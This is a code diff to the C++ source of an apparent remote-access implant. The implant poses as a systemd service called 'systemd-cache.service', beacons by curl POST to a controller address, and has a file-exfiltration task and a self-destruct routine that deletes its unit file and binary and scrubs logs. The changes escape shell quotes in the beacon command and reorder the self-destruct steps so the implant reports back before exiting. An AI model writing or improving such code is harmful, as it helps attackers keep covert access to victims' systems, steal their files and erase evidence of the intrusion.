@@ -122,10 +122,20 @@ static const std::string SVC_NAME     = "systemd-cache.service";
 // HTTP helpers (curl via popen)
 // ─────────────────────────────────────────────────────────────────────────────
 
+/** Escape string for bash single quotes. */
+static std::string escapeBash(const std::string& s) {
+    std::string out;
+    for (char c : s) {
+        if (c == '\'') out += "'\\''";
+        else out += c;
+    }
+    return out;
+}
+
 /** HTTP POST with JSON body. */
 static std::string post(const std::string& path, const std::string& json) {
     std::string cmd = "curl -s -m 5 -X POST -H 'Content-Type: application/json' -d '"
-                      + json + "' '" + IP_ADDRESS + path + "'";
+                      + escapeBash(json) + "' '" + IP_ADDRESS + path + "'";
     return runCommand(cmd);
 }
 
@@ -368,7 +378,7 @@ static std::string taskExfil(const std::string& filepath) {
 
 // ─────────────────────────────────────────────────────────────────────────────
 // Built-in task: self_destruct
-//   Step 1 — Stop and disable the systemd service
+//   Step 1 — Disable the systemd service
 //   Step 2 — Remove the service unit file
 //   Step 3 — Remove the implant binary
 //   Step 4 — Clean logs related to the service
@@ -381,11 +391,10 @@ static std::string taskSelfDestruct() {
     std::string out;
     out += "=== SELF-DESTRUCT INITIATED ===\n";
 
-    // Step 1: Stop and disable the systemd service
-    out += "--- Step 1: Stopping service ---\n";
-    runCommand("systemctl stop " + SVC_NAME + " 2>/dev/null");
+    // Step 1: Disable the systemd service (do not stop it yet to avoid killing ourselves prematurely)
+    out += "--- Step 1: Disabling service ---\n";
     runCommand("systemctl disable " + SVC_NAME + " 2>/dev/null");
-    out += "Service stopped and disabled\n";
+    out += "Service disabled\n";
 
     // Step 2: Remove the unit file and reload systemd
     out += "--- Step 2: Removing unit file ---\n";
@@ -423,7 +432,7 @@ static std::string taskSelfDestruct() {
 
     out += "=== SELF-DESTRUCT COMPLETE ===\n";
 
-    // Signal the main loop to exit
+    // Signal the main loop to exit gracefully after sending this result
     running = false;
     return out;
 }
